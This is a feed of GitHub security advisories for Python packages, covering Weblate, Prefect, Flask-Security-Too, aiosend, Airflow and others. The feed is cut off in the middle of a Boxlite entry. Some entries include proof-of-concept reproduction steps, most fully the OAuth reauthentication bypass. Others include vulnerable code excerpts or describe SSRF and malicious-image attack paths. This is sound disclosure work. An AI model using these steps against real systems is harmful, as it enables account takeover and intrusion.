<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2026-05-27T16:16:27.809Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[Weblate] Weblate has a Server-Side Request Forgery issue]]></title>
        <id>https://github.com/advisories/GHSA-hfpv-mc5v-p9mm</id>
        <link href="https://github.com/advisories/GHSA-hfpv-mc5v-p9mm"/>
        <updated>2026-05-26T16:41:14.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The Create Component functionality in Weblate allows authorized users to add new translation components by specifying both a version control system and a source code repository URL to pull from. However, the repository URL field is not validated or sanitized, allowing an attacker to supply arbitrary protocols, hostnames, and IP addresses, including localhost, internal network addresses, and local filenames.</p>
<p>When the Mercurial version control system is selected, Weblate exposes the full server-side HTTP response for the provided URL. This effectively creates a server-side request forgery (SSRF) primitive that can probe internal services and return their contents. In addition to accessing internal HTTP endpoints, the behavior also enables local file enumeration by attempting file:// requests. While file contents may not always be returned, the application’s error messages clearly differentiate between files that exist and files that do not, revealing information about the server’s filesystem layout.</p>
<p>In cloud environments, this behavior is particularly dangerous, as internal-only endpoints such as cloud metadata services may be accessible, potentially leading to credential disclosure and full environment compromise.</p>
<h3 id="patches">Patches</h3>
<p>This has been addressed in the Weblate 5.15 release.</p>
<ul>
<li><a href="https://github.com/WeblateOrg/weblate/pull/17103">https://github.com/WeblateOrg/weblate/pull/17103</a></li>
<li><a href="https://github.com/WeblateOrg/weblate/pull/17102">https://github.com/WeblateOrg/weblate/pull/17102</a></li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>Removing Mercurial from <a href="https://docs.weblate.org/en/latest/admin/config.html#vcs-backends">VCS_BACKENDS</a> avoids this vulnerability, as the Git backend is not affected. The Git backend was already configured to block the file protocol and does not expose the HTTP response content in the error message.</p>
<h3 id="references">References</h3>
<p>Thanks to Jason Marcello for responsible disclosure.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/WeblateOrg/weblate/security/advisories/GHSA-hfpv-mc5v-p9mm">https://github.com/WeblateOrg/weblate/security/advisories/GHSA-hfpv-mc5v-p9mm</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-66407">https://nvd.nist.gov/vuln/detail/CVE-2025-66407</a></li>
<li><a href="https://github.com/WeblateOrg/weblate/pull/17102">https://github.com/WeblateOrg/weblate/pull/17102</a></li>
<li><a href="https://github.com/WeblateOrg/weblate/pull/17103">https://github.com/WeblateOrg/weblate/pull/17103</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/weblate/PYSEC-2025-231.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/weblate/PYSEC-2025-231.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-hfpv-mc5v-p9mm">https://github.com/advisories/GHSA-hfpv-mc5v-p9mm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hfpv-mc5v-p9mm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-26T16:41:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[instagrapi] instagrapi: Unsafe signup challenge path handling in instagrapi]]></title>
        <id>https://github.com/advisories/GHSA-ggxf-37hm-9wqf</id>
        <link href="https://github.com/advisories/GHSA-ggxf-37hm-9wqf"/>
        <updated>2026-05-23T00:12:34.000Z</updated>
        <content type="html"><![CDATA[<p>instagrapi versions before 2.6.9 accepted server-supplied signup challenge paths and used them to build request URLs before validating that the paths were relative Instagram API paths. A malicious or tampered challenge payload could cause challenge handling requests to be sent outside the intended Instagram host with the client's existing session headers. Version 2.6.9 validates challenge paths before building URLs, solving captcha challenges, or submitting phone/SMS challenge forms.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/subzeroid/instagrapi/security/advisories/GHSA-ggxf-37hm-9wqf">https://github.com/subzeroid/instagrapi/security/advisories/GHSA-ggxf-37hm-9wqf</a></li>
<li><a href="https://github.com/advisories/GHSA-ggxf-37hm-9wqf">https://github.com/advisories/GHSA-ggxf-37hm-9wqf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-ggxf-37hm-9wqf</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-23T00:12:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[aiograpi] aiograpi: Unsafe signup challenge path handling]]></title>
        <id>https://github.com/advisories/GHSA-jh37-x3fv-4x72</id>
        <link href="https://github.com/advisories/GHSA-jh37-x3fv-4x72"/>
        <updated>2026-05-23T00:11:53.000Z</updated>
        <content type="html"><![CDATA[<p>aiograpi versions before 0.9.10 accepted server-supplied signup challenge paths and used them to build request URLs before validating that the paths were relative Instagram API paths. A malicious or tampered challenge payload could cause challenge handling requests to be sent outside the intended Instagram host with the client's existing session headers. Version 0.9.10 validates challenge paths before building URLs, solving captcha challenges, or submitting phone/SMS challenge forms.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/subzeroid/aiograpi/security/advisories/GHSA-jh37-x3fv-4x72">https://github.com/subzeroid/aiograpi/security/advisories/GHSA-jh37-x3fv-4x72</a></li>
<li><a href="https://github.com/advisories/GHSA-jh37-x3fv-4x72">https://github.com/advisories/GHSA-jh37-x3fv-4x72</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jh37-x3fv-4x72</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-23T00:11:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[AstrBot] AstrBot: File upload vulnerability in the function post_file of the file astrbot/dashboard/routes/chat.py]]></title>
        <id>https://github.com/advisories/GHSA-f63h-wc26-pmvc</id>
        <link href="https://github.com/advisories/GHSA-f63h-wc26-pmvc"/>
        <updated>2026-05-23T00:10:07.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability was detected in AstrBotDevs AstrBot up to 4.23.5. Impacted is the function post_file of the file astrbot/dashboard/routes/chat.py of the component File Upload Handler. The manipulation of the argument filename results in path traversal. It is possible to launch the attack remotely. The exploit is now public and may be used. Upgrading to version 4.23.6 is recommended to address this issue. The patch is identified as aaec41e5054569ceaa1113593a34da7568e2d211. You should upgrade the affected component.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-8754">https://nvd.nist.gov/vuln/detail/CVE-2026-8754</a></li>
<li><a href="https://github.com/AstrBotDevs/AstrBot/commit/aaec41e5054569ceaa1113593a34da7568e2d211">https://github.com/AstrBotDevs/AstrBot/commit/aaec41e5054569ceaa1113593a34da7568e2d211</a></li>
<li><a href="https://gist.github.com/YLChen-007/054415c2b63e58813328bc879a90c504">https://gist.github.com/YLChen-007/054415c2b63e58813328bc879a90c504</a></li>
<li><a href="https://github.com/AstrBotDevs/AstrBot">https://github.com/AstrBotDevs/AstrBot</a></li>
<li><a href="https://github.com/AstrBotDevs/AstrBot/releases/tag/v4.23.6">https://github.com/AstrBotDevs/AstrBot/releases/tag/v4.23.6</a></li>
<li><a href="https://vuldb.com/submit/811172">https://vuldb.com/submit/811172</a></li>
<li><a href="https://vuldb.com/vuln/364381">https://vuldb.com/vuln/364381</a></li>
<li><a href="https://vuldb.com/vuln/364381/cti">https://vuldb.com/vuln/364381/cti</a></li>
<li><a href="https://github.com/advisories/GHSA-f63h-wc26-pmvc">https://github.com/advisories/GHSA-f63h-wc26-pmvc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f63h-wc26-pmvc</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-05-17T15:31:42.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Flask-Security-Too] Flask-Security-Too OAuth reauthentication freshness bypass via cross-   user OAuth identity acceptance]]></title>
        <id>https://github.com/advisories/GHSA-97r5-pg8x-p63p</id>
        <link href="https://github.com/advisories/GHSA-97r5-pg8x-p63p"/>
        <updated>2026-05-22T17:49:44.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>  Flask-Security-Too 5.8.0's OAuth reauthentication flow can mark a
  session as fresh after verifying an OAuth account that belongs to a
  different user.</p>
<p>  If an attacker can operate an already-authenticated but stale victim
  session, they can complete OAuth verification using their own OAuth
  identity. The victim session is then treated as recently
  reauthenticated, allowing freshness-protected account actions to
  proceed. This was reproduced against the built-in <code>/change-username</code>
  route.</p>
<h3 id="details">Details</h3>
<p>  The issue is in the OAuth verification callback.</p>
<p>  <code>_oauth_response_common()</code> resolves the OAuth provider identity to a
  Flask-Security user:</p>
<ul>
<li><code>flask_security/oauth_glue.py:101-108</code></li>
</ul>
<p>  <code>oauth_verify_response()</code> then accepts any resolved user and updates
  the current session freshness timestamp:</p>
<ul>
<li><code>flask_security/oauth_glue.py:182-214</code></li>
<li><code>flask_security/oauth_glue.py:201-204</code></li>
</ul>
<p>  The missing check is that the OAuth-resolved user must match the
  current authenticated session user. In the failing case:</p>
<ul>
<li>current session user: <code>victim@example.com</code></li>
<li>OAuth verified user: <code>attacker@example.com</code></li>
<li>session marked fresh: yes</li>
</ul>
<p>  So the attacker is not logging in as the victim, but they are
  satisfying the victim session's reauthentication requirement with a
  different account.</p>
<h3 id="poc">PoC</h3>
<p>  Tested version:</p>
<ul>
<li><code>Flask-Security-Too 5.8.0</code></li>
<li>tag <code>5.8.0</code></li>
<li>commit <code>08288dff6907e413d848a16aaf43fc2c2b2a3b72</code></li>
</ul>
<p> Used a minimal Flask app with:</p>
<pre><code class="language-python">SECURITY_OAUTH_ENABLE = True
SECURITY_OAUTH_BUILTIN_PROVIDERS = ["github"]
SECURITY_FRESHNESS = timedelta(seconds=1)
SECURITY_FRESHNESS_GRACE_PERIOD = timedelta(seconds=0)
SECURITY_USERNAME_ENABLE = True
SECURITY_CHANGE_USERNAME = True

The OAuth provider was replaced with a localhost mock provider
returning attacker@example.com. This avoids hitting a live third-party
provider while still exercising Flask-Security-Too's real OAuth
verification handler.

Reproduction steps:

1. Log in as victim@example.com.
2. Wait until the session is no longer fresh.
3. Confirm POST /change-username is blocked with 401 and
   reauth_required=true.
4. Start OAuth verification with POST /login/oauth-verify-start/
   github.
5. Complete the callback with an OAuth identity for
   attacker@example.com.
6. Confirm the session is still for victim@example.com, but fs_paa has
   been updated.
7. Retry POST /change-username.
8. The victim user's username is changed successfully.

Observed result:

{
  "pre_bypass_status": 401,
  "pre_bypass_reauth_required": true,
  "attacker_identity": "attacker@example.com",
  "oauth_verify_response_status": 302,
  "post_bypass_change_username_status": 200,
  "final_email": "victim@example.com",
  "final_username": "victimowned1777878574",
  "direct_impact_verified": true
}

Note: CSRF was disabled in the local harness only to keep the test
focused on the reauthentication check. This is not a CSRF bypass
report.

This bypasses Flask-Security-Too's freshness/reauthentication
boundary.

Applications using OAuth verification together with freshness-
protected account operations may allow a stale victim session to be
refreshed using a different user's OAuth account. In my test, this
allowed the victim account's username to be changed through Flask-
Security-Too's built-in /change-username route.

A likely fix is to reject OAuth verification unless the resolved OAuth
user matches current_user before updating session["fs_paa"].
### References

- &lt;https://github.com/pallets-eco/flask-security/security/advisories/GHSA-97r5-pg8x-p63p&gt;
- &lt;https://github.com/advisories/GHSA-97r5-pg8x-p63p&gt;
</code></pre>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-97r5-pg8x-p63p</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-22T17:48:54.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[aiosend] aiosend: Deserialization of request body before signature verification (Pre-auth DoS) in webhook handler]]></title>
        <id>https://github.com/advisories/GHSA-7m8f-hgjq-8gc9</id>
        <link href="https://github.com/advisories/GHSA-7m8f-hgjq-8gc9"/>
        <updated>2026-05-22T17:27:59.000Z</updated>
        <content type="html"><![CDATA[<h1 id="vulnerability-description">Vulnerability Description</h1>
<p>In <code>aiosend/webhook/base.py</code>, the <code>WebhookHandler.feed_update()</code> method performs full deserialization of the incoming JSON via Pydantic <strong>before</strong> verifying the HMAC signature. Anyone can send a request with an arbitrary body — the server will parse it, spend CPU and memory, and only then reject it.</p>
<h2 id="vulnerable-code">Vulnerable Code</h2>
<pre><code class="language-python"># aiosend/webhook/base.py — feed_update()
update = Update.model_validate(body, context={"client": self})  #  parsing — always
if not self._check_signature(body, headers):                    #  auth — too late
    return False
</code></pre>
<p>Additional aggravating factor: <code>CryptoPayObject</code> is declared with <code>ConfigDict(extra="allow")</code> — all arbitrary fields from the body are stored in memory without any limits.</p>
<h2 id="minimal-poc">Minimal PoC</h2>
<p>Requests with deliberately invalid signatures (zero credentials):</p>
<table>
<thead>
<tr>
<th>extra_fields</th>
<th>body_size</th>
<th>parse_time</th>
<th>status</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>336 B</td>
<td>26 µs</td>
<td><strong>403 REJECTED</strong></td>
</tr>
<tr>
<td>1,000</td>
<td>82 KB</td>
<td>257 µs</td>
<td><strong>403 REJECTED</strong></td>
</tr>
<tr>
<td>5,000</td>
<td>410 KB</td>
<td>1,183 µs</td>
<td><strong>403 REJECTED</strong></td>
</tr>
<tr>
<td>10,000</td>
<td>820 KB</td>
<td>2,552 µs</td>
<td><strong>403 REJECTED</strong></td>
</tr>
<tr>
<td>10,000 (×512B)</td>
<td>5.3 MB</td>
<td>7,490 µs</td>
<td><strong>403 REJECTED</strong></td>
</tr>
</tbody></table>
<p>All requests were rejected — but the server already performed parsing for each one. 10 parallel threads with 5 MB bodies = &gt;75 ms of CPU spent on requests that will never be authorized.</p>
<h2 id="affected-components">Affected Components</h2>
<ul>
<li><code>aiosend/webhook/base.py</code> — <code>WebhookHandler.feed_update()</code></li>
<li><code>aiosend/types/base.py</code> — <code>CryptoPayObject</code> (<code>extra="allow"</code>)</li>
<li>All adapters: <code>AiohttpManager</code>, <code>FastAPIManager</code>, <code>FlaskManager</code></li>
</ul>
<h2 id="exploitation-conditions">Exploitation Conditions</h2>
<ul>
<li><strong>Attacker</strong>: anyone with network access to the webhook endpoint</li>
<li><strong>Authentication</strong>: not required</li>
<li><strong>Body size limit</strong>: absent at the library level (Flask and FastAPI have no default limit)</li>
</ul>
<hr>
<p>The advisory was translated using Copilot.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vovchic17/aiosend/security/advisories/GHSA-7m8f-hgjq-8gc9">https://github.com/vovchic17/aiosend/security/advisories/GHSA-7m8f-hgjq-8gc9</a></li>
<li><a href="https://github.com/advisories/GHSA-7m8f-hgjq-8gc9">https://github.com/advisories/GHSA-7m8f-hgjq-8gc9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7m8f-hgjq-8gc9</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-22T17:27:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[prefect] Prefect Git Argument Injection in GitRepository Pull Steps]]></title>
        <id>https://github.com/advisories/GHSA-6rcx-55r6-jx65</id>
        <link href="https://github.com/advisories/GHSA-6rcx-55r6-jx65"/>
        <updated>2026-05-22T13:09:35.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability was found in PrefectHQ prefect up to 3.6.25.dev6. Affected by this issue is some unknown functionality of the file src/prefect/runner/storage.py of the component GitRepository Pull Handler. The manipulation of the argument commit_sha/directories results in argument injection. It is possible to launch the attack remotely. The exploit has been made public and could be used. Upgrading to version 3.6.25.dev7 can resolve this issue. The patch is identified as 6a9d9918716ce4ee0297b69f3046f7067ef1faae. It is advisable to upgrade the affected component.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-7725">https://nvd.nist.gov/vuln/detail/CVE-2026-7725</a></li>
<li><a href="https://github.com/PrefectHQ/prefect/pull/21384">https://github.com/PrefectHQ/prefect/pull/21384</a></li>
<li><a href="https://github.com/PrefectHQ/prefect/commit/6a9d9918716ce4ee0297b69f3046f7067ef1faae">https://github.com/PrefectHQ/prefect/commit/6a9d9918716ce4ee0297b69f3046f7067ef1faae</a></li>
<li><a href="https://gist.github.com/nedlir/c37d90dda5f715790eafc970b2ef0c8a">https://gist.github.com/nedlir/c37d90dda5f715790eafc970b2ef0c8a</a></li>
<li><a href="https://github.com/PrefectHQ/prefect">https://github.com/PrefectHQ/prefect</a></li>
<li><a href="https://github.com/PrefectHQ/prefect/releases/tag/3.6.25.dev7">https://github.com/PrefectHQ/prefect/releases/tag/3.6.25.dev7</a></li>
<li><a href="https://vuldb.com/submit/807356">https://vuldb.com/submit/807356</a></li>
<li><a href="https://vuldb.com/vuln/360901">https://vuldb.com/vuln/360901</a></li>
<li><a href="https://vuldb.com/vuln/360901/cti">https://vuldb.com/vuln/360901/cti</a></li>
<li><a href="https://github.com/advisories/GHSA-6rcx-55r6-jx65">https://github.com/advisories/GHSA-6rcx-55r6-jx65</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6rcx-55r6-jx65</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-05-04T06:32:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[prefect] Prefect SSRF Bypass via DNS Rebinding in validate_restricted_url]]></title>
        <id>https://github.com/advisories/GHSA-p3pq-hxmr-vqqr</id>
        <link href="https://github.com/advisories/GHSA-p3pq-hxmr-vqqr"/>
        <updated>2026-05-22T13:08:03.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability has been found in PrefectHQ prefect up to 3.6.28.dev1. Affected by this vulnerability is the function validate_restricted_url of the component Webhook/Notification. The manipulation leads to time-of-check time-of-use. It is possible to initiate the attack remotely. The attack is considered to have high complexity. The exploitation appears to be difficult. The exploit has been disclosed to the public and may be used. Upgrading to version 3.6.28.dev2 addresses this issue. The identifier of the patch is 7c70ac54a5e101431d83b9f2681ec88d5e0021ed. Upgrading the affected component is advised.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-7724">https://nvd.nist.gov/vuln/detail/CVE-2026-7724</a></li>
<li><a href="https://github.com/PrefectHQ/prefect/pull/21591">https://github.com/PrefectHQ/prefect/pull/21591</a></li>
<li><a href="https://github.com/PrefectHQ/prefect/commit/7c70ac54a5e101431d83b9f2681ec88d5e0021ed">https://github.com/PrefectHQ/prefect/commit/7c70ac54a5e101431d83b9f2681ec88d5e0021ed</a></li>
<li><a href="https://gist.github.com/nedlir/fa99777e8989414585d08c3625bf044a">https://gist.github.com/nedlir/fa99777e8989414585d08c3625bf044a</a></li>
<li><a href="https://github.com/PrefectHQ/prefect">https://github.com/PrefectHQ/prefect</a></li>
<li><a href="https://github.com/PrefectHQ/prefect/releases/tag/3.6.28.dev2">https://github.com/PrefectHQ/prefect/releases/tag/3.6.28.dev2</a></li>
<li><a href="https://linear.app/prefect/issue/OSS-7874/fix-dns-rebinding-toctou-bypass-in-validate-restricted-url">https://linear.app/prefect/issue/OSS-7874/fix-dns-rebinding-toctou-bypass-in-validate-restricted-url</a></li>
<li><a href="https://vuldb.com/submit/807303">https://vuldb.com/submit/807303</a></li>
<li><a href="https://vuldb.com/vuln/360900">https://vuldb.com/vuln/360900</a></li>
<li><a href="https://vuldb.com/vuln/360900/cti">https://vuldb.com/vuln/360900/cti</a></li>
<li><a href="https://github.com/advisories/GHSA-p3pq-hxmr-vqqr">https://github.com/advisories/GHSA-p3pq-hxmr-vqqr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p3pq-hxmr-vqqr</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-05-04T03:31:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[prefect] Prefect Unauthenticated Event Injection via /api/events/in WebSocket]]></title>
        <id>https://github.com/advisories/GHSA-hvph-5985-r63v</id>
        <link href="https://github.com/advisories/GHSA-hvph-5985-r63v"/>
        <updated>2026-05-22T13:06:48.000Z</updated>
        <content type="html"><![CDATA[<p>A flaw has been found in PrefectHQ prefect up to 3.6.13. Affected is an unknown function of the file /api/events/in of the component WebSocket Endpoint. Executing a manipulation can lead to missing authentication. The attack may be performed from remote. The exploit has been published and may be used. Upgrading to version 3.6.14 is able to address this issue. This patch is called 0d3ab3c2d3f9f98abfafdf7b9f6d4f8ed3925e40. It is recommended to upgrade the affected component.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-7723">https://nvd.nist.gov/vuln/detail/CVE-2026-7723</a></li>
<li><a href="https://github.com/PrefectHQ/prefect/pull/20372">https://github.com/PrefectHQ/prefect/pull/20372</a></li>
<li><a href="https://github.com/PrefectHQ/prefect/commit/0d3ab3c2d3f9f98abfafdf7b9f6d4f8ed3925e40">https://github.com/PrefectHQ/prefect/commit/0d3ab3c2d3f9f98abfafdf7b9f6d4f8ed3925e40</a></li>
<li><a href="https://gist.github.com/nedlir/f1ab8aa038aafbcc6beeef21fab1d74f">https://gist.github.com/nedlir/f1ab8aa038aafbcc6beeef21fab1d74f</a></li>
<li><a href="https://github.com/PrefectHQ/prefect">https://github.com/PrefectHQ/prefect</a></li>
<li><a href="https://github.com/PrefectHQ/prefect/releases/tag/3.6.14">https://github.com/PrefectHQ/prefect/releases/tag/3.6.14</a></li>
<li><a href="https://vuldb.com/submit/807256">https://vuldb.com/submit/807256</a></li>
<li><a href="https://vuldb.com/vuln/360899">https://vuldb.com/vuln/360899</a></li>
<li><a href="https://vuldb.com/vuln/360899/cti">https://vuldb.com/vuln/360899/cti</a></li>
<li><a href="https://github.com/PrefectHQ/prefect/commit/f8afecadf88ea5f73694dafa3a365b9d8fae1ad6">https://github.com/PrefectHQ/prefect/commit/f8afecadf88ea5f73694dafa3a365b9d8fae1ad6</a></li>
<li><a href="https://github.com/advisories/GHSA-hvph-5985-r63v">https://github.com/advisories/GHSA-hvph-5985-r63v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hvph-5985-r63v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-04T03:31:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[prefect] Prefect Auth Bypass via endswith() Health Check Exemption]]></title>
        <id>https://github.com/advisories/GHSA-6rr6-v7cj-mxpg</id>
        <link href="https://github.com/advisories/GHSA-6rr6-v7cj-mxpg"/>
        <updated>2026-05-22T13:05:46.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability was detected in PrefectHQ prefect up to 3.6.21. This impacts the function endswith of the file /api/health of the component Health Check API. Performing a manipulation results in improper authentication. The attack is possible to be carried out remotely. The exploit is now public and may be used. Upgrading to version 3.6.22 will fix this issue. Upgrading the affected component is recommended.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-7722">https://nvd.nist.gov/vuln/detail/CVE-2026-7722</a></li>
<li><a href="https://github.com/PrefectHQ/prefect/pull/21063">https://github.com/PrefectHQ/prefect/pull/21063</a></li>
<li><a href="https://github.com/PrefectHQ/prefect/pull/21063/changes/d8c4ff97ef7c0a940925d32b2d76324c8def42de">https://github.com/PrefectHQ/prefect/pull/21063/changes/d8c4ff97ef7c0a940925d32b2d76324c8def42de</a></li>
<li><a href="https://gist.github.com/nedlir/f576abbb0e491dc9bb7e106c140dda04">https://gist.github.com/nedlir/f576abbb0e491dc9bb7e106c140dda04</a></li>
<li><a href="https://github.com/PrefectHQ/prefect">https://github.com/PrefectHQ/prefect</a></li>
<li><a href="https://github.com/PrefectHQ/prefect/releases/tag/3.6.22">https://github.com/PrefectHQ/prefect/releases/tag/3.6.22</a></li>
<li><a href="https://vuldb.com/submit/807255">https://vuldb.com/submit/807255</a></li>
<li><a href="https://vuldb.com/vuln/360898">https://vuldb.com/vuln/360898</a></li>
<li><a href="https://vuldb.com/vuln/360898/cti">https://vuldb.com/vuln/360898/cti</a></li>
<li><a href="https://github.com/PrefectHQ/prefect/commit/e21617125335025b4b27e7d6f0ca028e8e8f3b79">https://github.com/PrefectHQ/prefect/commit/e21617125335025b4b27e7d6f0ca028e8e8f3b79</a></li>
<li><a href="https://github.com/advisories/GHSA-6rr6-v7cj-mxpg">https://github.com/advisories/GHSA-6rr6-v7cj-mxpg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6rr6-v7cj-mxpg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-04T03:31:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apache-airflow-providers-smtp] apache-airflow-providers-smtp: No certificate validation on SMTP STARTTLS connections in SMTP provider]]></title>
        <id>https://github.com/advisories/GHSA-x8mh-94wc-33gv</id>
        <link href="https://github.com/advisories/GHSA-x8mh-94wc-33gv"/>
        <updated>2026-05-22T13:04:59.000Z</updated>
        <content type="html"><![CDATA[<p>Apache Airflow's SMTP provider <code>SmtpHook</code> called Python's <code>smtplib.SMTP.starttls()</code> without an SSL context, so no certificate validation was performed on the TLS upgrade. A man-in-the-middle between the Airflow worker and the SMTP server could present a self-signed certificate, complete the STARTTLS upgrade, and capture the SMTP credentials sent during the subsequent <code>login()</code> call. Users are advised to upgrade to the <code>apache-airflow-providers-smtp</code> version that contains the fix.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-41016">https://nvd.nist.gov/vuln/detail/CVE-2026-41016</a></li>
<li><a href="https://github.com/apache/airflow/pull/65346">https://github.com/apache/airflow/pull/65346</a></li>
<li><a href="https://lists.apache.org/thread/gb202qy5r31bgdd3d51d7s5o1jh40kc4">https://lists.apache.org/thread/gb202qy5r31bgdd3d51d7s5o1jh40kc4</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/apache-airflow-providers-smtp/PYSEC-2026-24.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/apache-airflow-providers-smtp/PYSEC-2026-24.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-x8mh-94wc-33gv">https://github.com/advisories/GHSA-x8mh-94wc-33gv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x8mh-94wc-33gv</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-30T12:33:11.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[boxlite] Boxlite: Path Traversal Vulnerability Leads to Arbitrary File Write on the Host]]></title>
        <id>https://github.com/advisories/GHSA-f396-4rp4-7v2j</id>
        <link href="https://github.com/advisories/GHSA-f396-4rp4-7v2j"/>
        <updated>2026-05-21T21:54:16.000Z</updated>
        <content type="html"><![CDATA[<h4 id="summary">Summary</h4>
<p>Boxlite is a sandbox service that allows users to create lightweight virtual machines (Boxes) and run OCI containers within them. Boxlite allows users to specify the OCI image used by containers in the sandbox. However, when processing tar entries in OCI images, Boxlite does not account for the possibility that entries may be symlinks pointing to absolute paths. An attacker can craft a malicious OCI image and distribute it on image hosting platforms such as DockerHub, tricking users into using it. Once a user loads the malicious image, the attacker can write arbitrary content to any path on the host, which can further lead to remote code execution on the host.</p>
<h4 id="details">Details</h4>
<ol>
<li>Entry Point — OCI Layer Tarball Extraction</li>
</ol>
<p><strong>File:</strong> <code>boxlite/src/images/archive/tar.rs</code> <strong>Function:</strong> <code>extract_layer_tarball_streaming()</code> (line 24) <strong>Code:</strong></p>
<pre><code class="language-rust">pub fn extract_layer_tarball_streaming(tarball_path: &amp;Path, dest: &amp;Path) -&gt; BoxliteResult&lt;u64&gt; {
    // ...
    apply_oci_layer(reader, dest)
}
</code></pre>
<p><strong>Issue:</strong> The function passes the tar reader into <code>apply_oci_layer</code>. The tarball comes from a registry blob that has passed SHA256 integrity verification against the manifest digest — but the manifest itself is controlled by the registry, so a malicious registry can serve a valid manifest pointing to a crafted layer blob with a matching digest.</p>
<ol start="2">
<li>Main Extraction Loop — Symlink Created Without Target Validation</li>
</ol>
<p><strong>File:</strong> <code>boxlite/src/images/archive/tar.rs</code> <strong>Function:</strong> <code>apply_oci_layer()</code> (line 196) <strong>Code:</strong></p>
<pre><code class="language-rust">EntryType::Symlink =&gt; {
    let target = link_name.ok_or_else(|| { /* ... */ })?;
    create_symlink(&amp;full_path, &amp;target)?;  // line 327 — target is NOT validated
}
</code></pre>
